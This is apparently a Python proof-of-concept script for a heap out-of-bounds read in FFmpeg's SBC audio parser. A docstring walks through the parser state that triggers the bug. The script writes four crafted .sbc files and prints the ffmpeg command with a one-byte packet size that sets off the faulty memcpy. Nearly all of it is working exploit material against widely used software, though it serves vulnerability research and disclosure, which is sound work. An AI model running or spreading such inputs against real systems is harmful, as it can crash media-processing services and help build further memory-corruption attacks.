#!/usr/bin/env python3
"""
PoC generator for SBC parser heap OOB read.

Vulnerability: sbc_parse() in libavcodec/sbc_parser.c lines 89-94
CWE-125: Out-of-bounds Read

The parser maintains a 3-byte pc->header[] buffer and an int header_size.

Trigger sequence (with raw_packet_size=1 so parser gets 1 byte per call):
  Call 1 (buf=[0x9C], buf_size=1):
    - header_size=0, tries sbc_parse_header() -> returns -1 (len < 3)
    - Sets pc->header_size = FFMIN(3, 1) = 1
    - Stores 0x9C in pc->header[0]
  Call 2 (buf=[0x00], buf_size=1):
    - pc->header_size=1 (non-zero), enters the header-completion branch
    - memcpy(pc->header + 1, buf, sizeof(pc->header) - 1)
      = memcpy(pc->header + 1, buf, 2)   <-- reads 2 bytes from a 1-byte buffer
    - OOB read of 1 byte past end of the heap allocation
"""

import os
import sys

SBC_SYNCWORD  = 0x9C
MSBC_SYNCWORD = 0xAD

poc_dir = os.path.dirname(os.path.abspath(__file__))


def create_files():
    # Primary crafted file: starts with SBC syncword followed by several zero bytes.
    # With -raw_packet_size 1, the demuxer feeds 1 byte per read_packet call.
    # - First parser call  gets 0x9C (1 byte)  -> sets header_size = 1
    # - Second parser call gets 0x00 (1 byte)  -> OOB memcpy reads 2 bytes from it
    primary = bytes([SBC_SYNCWORD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    path1 = os.path.join(poc_dir, "vuln_001_input.sbc")
    with open(path1, "wb") as f:
        f.write(primary)
    print(f"[+] Created {path1} ({len(primary)} bytes): {primary.hex()}")

    # Variant 2: only 2 bytes — minimum to have a syncword and one follow-up byte.
    path2 = os.path.join(poc_dir, "vuln_001_input2.sbc")
    with open(path2, "wb") as f:
        f.write(bytes([SBC_SYNCWORD, 0x00]))
    print(f"[+] Created {path2} (2 bytes)")

    # Variant 3: MSBC syncword path (0xAD 0x00 0x00 ...).
    # In sbc_parse_header: needs data[0]==MSBC_SYNCWORD && data[1]==0 && data[2]==0
    # Same state machine applies; with raw_packet_size=1, header_size path is hit.
    path3 = os.path.join(poc_dir, "vuln_001_input3.sbc")
    with open(path3, "wb") as f:
        f.write(bytes([MSBC_SYNCWORD, 0x00, 0x00, 0x00]))
    print(f"[+] Created {path3} (4 bytes, MSBC syncword)")

    # Variant 4: raw_packet_size=2 still triggers if buf_size(2) < (3 - header_size(1))
    # With raw_packet_size=2:
    #   Call 1 gets [0x9C, 0x00] (2 bytes) -> sbc_parse_header returns -1 (len<3)
    #                                       -> header_size = FFMIN(3,2) = 2
    #   Call 2 gets [0x00] (1 byte) if file tail is odd, or [0x00, 0x00] (2 bytes)
    #   With 1 byte: memcpy(header+2, buf, 1) -> OK (no OOB, copies 1 byte from 1-byte buf)
    # So raw_packet_size=1 is the best trigger. Include for reference.
    path4 = os.path.join(poc_dir, "vuln_001_input4.sbc")
    with open(path4, "wb") as f:
        f.write(bytes([SBC_SYNCWORD, 0x00, 0x00, 0x00, 0x00]))
    print(f"[+] Created {path4} (5 bytes)")

    print("\n[*] All input files created.")
    print("[*] Trigger requires: ffmpeg -f sbc -raw_packet_size 1 -i <file>")
    print("[*] This ensures the parser receives exactly 1 byte per call,")
    print("[*] causing the header-completion memcpy to read 2 bytes from a 1-byte buffer.")


if __name__ == "__main__":
    create_files()
